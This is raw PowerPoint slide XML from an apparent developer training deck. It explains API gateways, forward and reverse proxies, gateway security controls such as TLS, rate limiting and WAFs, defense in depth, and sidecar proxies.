          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“The bouncer + receptionist + traffic cop at the building entrance.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Typical examples: AWS API Gateway, Kong, Apigee, NGINX acting as a gateway, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>forward proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, sits in front of clients and routes their traffic to servers, primarily to manage and protect client-side traffic. A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>reverse proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> sits in front of one or more servers, handling incoming requests from clients to protect and manage the servers, offering benefits like load balancing and security.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE500FF3-5736-B139-E09C-1DD8885E492F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>121</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="221963114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0AFA3-8CF2-7D88-2325-DECF71465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A3917-9437-27B0-3114-1182EB0C6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BD088-0523-47C5-E33F-22AD13E42B4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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1E08AD69-6A01-1095-160B-3F60EB921F03}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>122</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4892608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279A-93CF-E06B-B16A-7A73ABDBD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14F05-466A-0BC3-EF7F-B79101A36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8ED75-1C7B-8F81-F10A-F6EFDD92C08B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Centralized security controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>input validation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> at a single choke point instead of re-implementing in every service</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>StormIT+3Practical DevSecOps+3Eyer+3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example: all inbound traffic must present a valid OAuth2/OIDC token; services trust the “x-user-id” claim injected by the gateway.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Rate limiting &amp; DoS protection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Protect downstream services and databases from brute-force or resource-exhaustion attacks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example: “No client can hit /login more than 5 req/s; burst requests are throttled.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Surface reduction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You can expose </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> the routes meant for external use.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Internal admin/debug endpoints never appear in the gateway config, so they’re unreachable from the internet.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Centralized logging &amp; monitoring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Easier to detect anomalies: user X suddenly making 10,000 requests to /export in 1 minute? Red flag.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Correlate attacks by IP, token, or API key.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web Application Firewall (WAF) integration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Many gateways integrate with a WAF layer to block common injection payloads, bot traffic, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>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AD294D95-C88A-2B6F-B398-3432CBEB1640}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>123</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="131024298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3793F-47A0-6973-E817-444EF2073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B2D33-BA8A-01DD-116D-AFF09A4A5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3748A-3674-2EEC-073D-96AB2C9DF9A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Remember: APIGW's protect your north-south, but you can't </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>over-rely</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> on them to the point of forgetting your east-west</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48F6AFB4-6460-8A3F-9C62-8BC6C4CCBEBC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>124</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16586745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12D9F-F497-9B6C-86DB-F1BD54872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5A50E-C991-39EB-23BC-395D3BE18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8FDED-20D2-4F4F-8EE8-E64AA2F48C63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you should be asking:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Which services are reachable directly from the internet, and why?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“What security guarantees does the gateway enforce that downstream services rely on?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“If the gateway is misconfigured, do our services still apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>defense in depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, validation)?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76E1DC37-4024-64CC-7652-E6949296BC56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>125</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18926275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AB532-3392-EC71-B843-A402FE513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48937-F1E6-904E-2AC8-E9C43BE19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9F2A0-1257-5799-3836-22894CF58460}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you should be asking:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Which services are reachable directly from the internet, and why?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“What security guarantees does the gateway enforce that downstream services rely on?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“If the gateway is misconfigured, do our services still apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>defense in depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, validation)?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3577FB6E-E946-B640-88EC-DE4C6102FF87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>126</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20084609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98D0-A30E-9CF1-D0F0-124398CA5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B66C0-0506-DD59-9055-BEAFA1C79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B3482-71E0-8766-8FEC-BF32FACBF702}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" b="1"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B7A5E036-C3CA-DE77-0A16-B13F1EAC8965}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>127</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="975346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12DA2-293F-F4D3-1D4B-939752D0E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EB894-EEB2-D1AE-4485-F769C3FEB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4FD09-6543-F07B-E536-1AAEF80DBEFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A SCP intercepts and manages all network traffic running without modifying the application code itself</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. It acts as a "helper" or "assistant" for the application, allowing the main service to focus on its core functions while the sidecar takes care of auxiliary tasks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
